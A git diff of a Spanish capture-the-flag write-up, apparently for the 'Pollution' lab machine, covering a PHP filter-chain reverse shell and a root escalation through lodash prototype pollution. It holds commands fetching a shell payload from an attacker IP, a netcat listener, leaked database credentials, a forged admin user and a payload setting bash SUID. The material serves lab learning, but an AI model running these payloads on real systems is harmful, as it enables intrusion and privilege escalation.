@@ -273,13 +273,13 @@ python3 chain.py --chain '<?php system("id"); ?> '
 Con esto podemos entablarnos una shell, el inconveniente es que la web no acepta url tan largas por lo que podemos dividirlo por partes para que se pueda ejecutar nuestro archivo. Para eso creamos un archivo b con una reverse shell.
 
 ```shell
-python3 chain.py --chain '<?=`wget 10.10.14.14/b -o /tmp/b` ?>'
+python3 chain.py --chain '<?=`curl 10.10.14.14/b -o /tmp/b` ?>'
 
-python3 chain.py --chain '<?=`chmod +x /tmp/a` ?>'
+python3 chain.py --chain '<?=`chmod +x /tmp/b` ?>'
 
-rlwrap nc -lvnp 443
+nc -lvnp 443
 
-python3 chain.py --chain '<?=`bash -c /tmp/a` ?>'
+python3 chain.py --chain '<?=`bash -c /tmp/b` ?>'
 ```
 Una vez dentro como www-data podemos ver los procesos que se están ejecutando y vemos que php-fpm lo ejecuta victor.
 
@@ -310,4 +310,128 @@ for FN in $FILENAMES; do
     cat $OUTPUT
 done
 ```
-Para root
+Para root primero encontramos un directorio donde se cuentra pollution_api donde podemos encontrar rutas donde podemos hacer login, registrarnos, revisar mensajes y mandarlos. En la sección de mandar mensajes nos encotramos con el siguiente código.
+
+```js
+const Message = require('../models/Message');
+const { decodejwt } = require('../functions/jwt');
+const _ = require('lodash');
+const { exec } = require('child_process');
+
+const messages_send = async(req,res)=>{
+    const token = decodejwt(req.headers['x-access-token'])
+    if(req.body.text){
+
+        const message = {
+            user_sent: token.user,
+            title: "Message for admins",
+        };
+
+        _.merge(message, req.body);
+
+        exec('/home/victor/pollution_api/log.sh log_message');
+```
+Podemos ver el merge que se hace sobre el mensaje y el request que mandamos a esta ruta. Intentamos mandar cualquier cosa para ver cómo funciona. Al mandar una petición nos muestra un mensaje que no estamos autorizados.
+
+```shell
+curl -X POST http://127.0.0.1:3000/admin/messages/send -H "Content-Type: application/json" -d '{"text":"test"}'
+{"Status":"Error","Message":"You are not allowed"}
+```
+Revisando en el directorio de rutas encontramos un admin.js que nos muestra cómo se está haciendo esta autenticación.
+
+```js
+victor@pollution:~/pollution_api/routes$ cat admin.js 
+const express = require('express');
+const router = express.Router();
+const User = require('../models/User');
+const { decodejwt } = require('../functions/jwt')
+
+//controllers
+
+const { messages } = require('../controllers/Messages');
+const { messages_send } = require('../controllers/Messages_send');
+
+router.use('/', async(req,res,next)=>{
+    if(req.headers["x-access-token"]){
+
+        const token = decodejwt(req.headers["x-access-token"]);
+        if(token){
+            const find = await User.findAll({where: {username: token.user, role: token.role}});
+            
+            if(find.length > 0){
+
+                if(find[0].username == token.user && find[0].role == token.role && token.role == "admin"){
+
+                    return next();
+
+                }
+
+                return res.json({Status: "Error", Message: "You are not allowed"});
+            }
+```
+Esta obteniendo el `x-access-token` para validarlo que el usuario sea administrador, en caso contrarios muestra el valor que no tenemos autorización. De alguna forma se debe de cambiar el rol de los usuarios que vamos creando. Revisando un poco los archivos de la página web, encontramos el usuario y contraseña de la base de datos de mysql.
+
+```shell
+victor@pollution:/var/www/collect$ cat config.php 
+<?php
+
+
+return [
+    "db" => [
+        "host" => "localhost",
+        "dbname" => "webapp",
+        "username" => "webapp_user",
+        "password" => "Str0ngP4ssw0rdB*12@1",
+        "charset" => "utf8"
+    ],
+];
+```
+Ingresando a la base de datos de pollution_api podemos ver la tabla de usuarios, al hacerle un describe vemos que tiene en los campos disponibles el del rol, procedemos a crear un nuevo usuario asignándole el usuario admin.
+
+```shell
+MariaDB [pollution_api]> Describe users;
++-----------+--------------+------+-----+---------+----------------+
+| Field     | Type         | Null | Key | Default | Extra          |
++-----------+--------------+------+-----+---------+----------------+
+| id        | int(11)      | NO   | PRI | NULL    | auto_increment |
+| username  | varchar(255) | NO   | UNI | NULL    |                |
+| password  | varchar(255) | NO   |     | NULL    |                |
+| role      | varchar(255) | NO   |     | NULL    |                |
+| createdAt | datetime     | NO   |     | NULL    |                |
+| updatedAt | datetime     | NO   |     | NULL    |                |
++-----------+--------------+------+-----+---------+----------------+
+6 rows in set (0.002 sec)
+
+MariaDB [pollution_api]> INSERT INTO users VALUES("1","guero", "guero123", "admin","1000-01-01 00:00:00","1000-01-01 00:00:00");
+Query OK, 1 row affected (0.001 sec)
+
+MariaDB [pollution_api]> select * from users;
++----+----------+----------+-------+---------------------+---------------------+
+| id | username | password | role  | createdAt           | updatedAt           |
++----+----------+----------+-------+---------------------+---------------------+
+|  1 | guero    | guero123 | admin | 1000-01-01 00:00:00 | 1000-01-01 00:00:00 |
++----+----------+----------+-------+---------------------+---------------------+
+1 row in set (0.000 sec)
+```
+Una vez terminada la creación procedemos a obtener el token mediante la api de /auth/login que se puede observar el la documentación de la api.
+
+```shell
+curl -X POST http://127.0.0.1:3000/auth/login -d '{"username":"guero", "password":"guero123"}' -H "Content-Type: application/json"
+{"Status":"Ok","Header":{"x-access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlcm8iLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2NzY2NzE4NTEsImV4cCI6MTY3NjY3NTQ1MX0.moLCrRAbi5rYsAxxiigwKGcx-71b-01geP6EmAzNpoc"}}
+```
+Con este token intentamos enviar un mensaje poniendo en la cabecera x-access-token y nuestro token. Vemos que tenemos un resultado ok, entonces podremos empezar a hacer el prototype pollution attack.
+
+```shell
+curl -X POST http://127.0.0.1:3000/admin/messages/send -H "x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlcm8iLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW
+4iLCJpYXQiOjE2NzY2NzE4NTEsImV4cCI6MTY3NjY3NTQ1MX0.moLCrRAbi5rYsAxxiigwKGcx-71b-01geP6EmAzNpoc" -H "Content-Type: application/json" -d '{"text":"text"}'
+{"Status":"Ok"}
+```
+Investigando un poco en [Link](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#exec-exploitation "HackTricks") podemos ver que los comando que podemos proporcionar para ejecutar comandos. Así hacemos la bash suid y habremos rooteado la máquina.
+
+```shell
+victor@pollution:~/pollution_api$ curl -X POST "http://127.0.0.1:3000/admin/messages/send" -H "x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlcm8iLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2NzY2Njk3NjcsImV4cCI6MTY3NjY3MzM2N30.XrzgV0vbUaTRN74sz-ZY6G2zsV1xNOx233FDUA4CL1E" -H "Content-Type: application/json" -d '{"text":{"__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"chmod +s /usr/bin/bash \").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}}'
+{"Status":"Ok"}
+
+victor@pollution:~/ls -la /usr/bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /usr/bin/bash
+```
